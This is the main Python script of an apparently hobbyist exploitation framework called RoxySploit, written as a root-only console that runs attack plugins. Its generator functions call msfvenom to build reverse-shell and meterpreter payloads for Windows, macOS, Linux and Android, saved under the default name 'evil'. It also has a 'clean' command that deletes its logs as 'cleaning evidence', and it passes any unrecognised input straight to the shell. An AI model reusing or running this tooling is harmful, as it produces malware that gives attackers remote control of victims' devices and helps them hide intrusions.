#!/usr/bin/python
# -*- coding: utf-8 -*-

import os, sys, time
import readline, rlcompleter
import os.path
from time import sleep
from core import menu
from core import modules
from core import help
from core import header
import platform
from plugins import *
import rlcompleter, readline
import os.path
import logging
import re
import glob
from terminaltables import DoubleTable
from os.path import join
from core import pluginfinder
from subprocess import check_output
os.system('clear')

time.sleep(1)
if not os.geteuid() == 0:
    sys.exit("""\033[1;91m\n[\033[1;m!\033[1;91m]\033[1;m RoxySploit Requires root access!!\n\033[1;m""")


version = "4.7.8"
intname = "rsf"
lan_ip = os.popen("ifconfig | grep -Eo 'inet (addr:)?([0-9]*\.){3}[0-9]*' | grep -Eo '([0-9]*\.){3}[0-9]*' | grep -v '127.0.0.1'").read()
public_ip = os.popen("wget http://ipinfo.io/ip -qO -").read()

dir = "plugins/"
test=os.listdir(dir)

for item in test:
    if item.endswith(".plugin"):
        plugins_all = item.split('.')[0]

options_sl = ['clean','others','gen','all','plugin','?','clear','exit','banner','help', 'show','ipnet','exploits','payloads','utilities']
addrs = glob.glob("plugins/*.plugin")
total_plugins = len(addrs)
tabcomp = options_sl
tabcomp +=addrs

def completer(text, state):
    options = [x for x in tabcomp if x.startswith(text)]
    try:
        return options[state]
    except IndexError:
        return None

readline.set_completer(completer)
readline.parse_and_bind("tab: complete")

RescoursesDir = os.getcwd()

LOGS = "storage/logs"
PLUGINS = "plugins"
STORAGE = "storage"
MODULES = "modules"
CORE = "core"
CHECK_LOGS = os.path.exists(LOGS)
CHECK_STORAGE = os.path.exists(STORAGE)
CHECK_MODULES = os.path.exists(MODULES)
CHECK_CORE = os.path.exists(CORE)
CHECK_PLUGINS = os.path.exists(PLUGINS)

if CHECK_PLUGINS == False:
    print "Missing files..."
    sys.exit()
else:
    var = "1"

if CHECK_CORE == False:
    print "Missing files..."
    sys.exit()
else:
    var = "1"

if CHECK_MODULES == False:
    print "Missing files..."
    sys.exit()
else:
    var = "1"

if CHECK_STORAGE == False:
    print "Missing files..."
    sys.exit()
else:
    var = "1"

os.system('clear')
time.sleep(0.1)
print "\033[1;94m[?]\033[1;m Starting Roxy Exploitation Framework..."
time.sleep(20)
RescoursesDir = os.getcwd()

dandtime = time.strftime("%d-%m-%Y-%H:%M:%S")

logfile = "%s/storage/logs/%s.log" % (RescoursesDir,dandtime)

if CHECK_LOGS == True:
    filename_logging = os.path.join(os.path.dirname(__file__), logfile)
    logging.basicConfig(filename=filename_logging, filemode='w', level=logging.DEBUG)
    print "\033[1;94m[?]\033[1;m Creating logfile:", logfile
else:
    print "\033[1;31m[?]\033[1;m Failed Creating logfile:", logfile

time.sleep(1)
os.system('clear')
print """
%s
       =[ \033[1;33mRoxy Exploitation Framework %s\033[1;97m     ]
+ -- --=[ Loaded plugins - %s                   ]
+ -- --=[ Codename : https://github.com/Eitenne ]
+ -- --=[ Welcome to RoxySploitPro - rsfpro     ]
""" % (header.main_header(),version,total_plugins)

def main():
    try:
        line_1 = "\033[1;4m" + intname + "\033[1;24m > "
        terminal = raw_input(line_1).lower()
        logging.info(terminal)
        time.sleep(0.5)
        if terminal[0:3] =='use':
            if terminal[4:] == terminal[4:]:
                os.system('python plugins/%s.plugin' % (terminal[4:]))
                main()
            #elif terminal[4:32] =='example':
                #example()
                #main()
        if terminal[0:6] == 'search':
            print "\033[1;94m[?]\033[1;m Searching %s" % (terminal[7:])
            time.sleep(1)
            names = addrs
            found = []
            for name in names:
                if terminal[7:] in name:
                    found.append(name)
            print found
            main()
        if terminal[0:3] =='gen':
            if terminal[4:28] =='exe':
                exe_gen()
                main()
            elif terminal[4:26] =='macho':
                macho_gen()
                main()
            elif terminal[4:23] =='elf':
                elf_gen()
                main()
            elif terminal[4:21] =='apk':
                apk_gen()
                main()
        elif terminal[0:13] == 'show payloads':
            modules.payloads()
            main()
        elif terminal[0:14] == 'show exploits':
            modules.exploits()
            main()
        elif terminal[0:94] == 'show utilities':
            modules.utilities()
            main()
        elif terminal[0:15] == 'show others':
            modules.others()
            main()
        elif terminal[0:17] == 'show all':
            modules.all()
            main()
        elif terminal[0:4] =='help':
            help.help()
            main()
        elif terminal[0:41] =='plugin':
            os.system('python plugins/hello.plugin')
            main()
        elif terminal[0:7] == 'show':
            showlist()
            main()
        elif terminal[0:2] =='?':
            help.help()
            main()
        elif terminal[0:5] =='ipnet':
            os.system('wine cmd.exe /c ipconfig')
            main()
        elif terminal[0:8] =='clean':
            os.system("echo 'Cleaning evidence ;)'; rm storage/logs/*")
            main()
        elif terminal[0:5] =='clear':
            os.system('clear')
            main()
        elif terminal[0:6] =='banner':
            os.system('clear')
            postit()
 	    menu.main_info()
            main()
        elif terminal[0:9] =='exit':
            exit()
        elif terminal[0:0] =='':
            os.system(terminal[0:])
            main()
        else:
            print "Command not found:", terminal
            main()
    except(KeyboardInterrupt):
        print "\n"
        return main()


def showlist():
	print """
Plugin Category
===============

 Name
 ----
 Payloads
 Exploits
 Utilities
 Others
 All
"""

def postit():
	print """
%s
       =[ \033[1;33mRoxy Exploitation Framework %s\033[1;97m     ]
+ -- --=[ Loaded plugins - %s                   ]
+ -- --=[ Codename : https://github.com/Eitenne ]
+ -- --=[ Welcome to RoxySploitPro - rsfpro     ]
""" % (header.main_header(),version,total_plugins)

def exe_gen():
    iper = "192.168.1.8"
    porter = "5384"
    namer = "evil"
    print "\033[1;94m[?]\033[1;m Host :: Your ip you want to listen on"
    ip = raw_input('\033[1;92m[+]\033[1;m ip: [' + iper + ']: ') or iper
    print "\033[1;94m[?]\033[1;m Port :: Your port you want to listen on"
    port = raw_input('\033[1;92m[+]\033[1;m port: [' + porter + ']: ') or porter
    print "\033[1;94m[?]\033[1;m Filename :: Filename to export as"
    name = raw_input('\033[1;92m[+]\033[1;m filename: [' + namer + ']: ') or namer
    os.system('msfvenom -p windows/meterpreter/reverse_tcp LHOST=' + ip + ' LPORT=' + port + ' -f exe > output/' + name + '.exe')
    print "Done... saved as " + RescoursesDir + "/" + name + ".exe"

def macho_gen():
    iper = "192.168.1.8"
    porter = "5384"
    namer = "evil"
    print "\033[1;94m[?]\033[1;m Host :: Your ip you want to listen on"
    ip = raw_input('\033[1;92m[+]\033[1;m ip: [' + iper + ']: ') or iper
    print "\033[1;94m[?]\033[1;m Port :: Your port you want to listen on"
    port = raw_input('\033[1;92m[+]\033[1;m port: [' + porter + ']: ') or porter
    print "\033[1;94m[?]\033[1;m Filename :: Filename to export as"
    name = raw_input('\033[1;92m[+]\033[1;m filename: [' + namer + ']: ') or namer
    os.system('msfvenom -p osx/x86/shell_reverse_tcp LHOST=' + ip + ' LPORT=' + port + ' -f macho > output/' + name + '.macho')
    print "Done... saved as " + RescoursesDir + "/" + name + ".macho"

def elf_gen():
    iper = "192.168.1.8"
    porter = "5384"
    namer = "evil"
    print "\033[1;94m[?]\033[1;m Host :: Your ip you want to listen on"
    ip = raw_input('\033[1;92m[+]\033[1;m ip: [' + iper + ']: ') or iper
    print "\033[1;94m[?]\033[1;m Port :: Your port you want to listen on"
    port = raw_input('\033[1;92m[+]\033[1;m port: [' + porter + ']: ') or porter
    print "\033[1;94m[?]\033[1;m Filename :: Filename to export as"
    name = raw_input('\033[1;92m[+]\033[1;m filename: [' + namer + ']: ') or namer
    os.system('msfvenom -p linux/x86/meterpreter/reverse_tcp LHOST=' + ip + ' LPORT=' + port + ' -f elf > output/' + name + '.elf')
    print "Done... saved as " + RescoursesDir + "/" + name + ".elf"

def apk_gen():
    iper = "192.168.1.8"
    porter = "5384"
    namer = "evil"
    print "\033[1;94m[?]\033[1;m Host :: Your ip you want to listen on"
    ip = raw_input('\033[1;92m[+]\033[1;m ip: [' + iper + ']: ') or iper
    print "\033[1;94m[?]\033[1;m Port :: Your port you want to listen on"
    port = raw_input('\033[1;92m[+]\033[1;m port: [' + porter + ']: ') or porter
    print "\033[1;94m[?]\033[1;m Filename :: Filename to export as"
    name = raw_input('\033[1;92m[+]\033[1;m filename: [' + namer + ']: ') or namer
    os.system('msfvenom -p android/meterpreter/reverse_tcp LHOST=' + ip + ' LPORT=' + port + ' R > output/' + name + '.apk')
    print "Done... saved as " + RescoursesDir + "/" + name + ".apk"

def start():
    menu.main_info()
    main()

if __name__=='__main__':
    start()
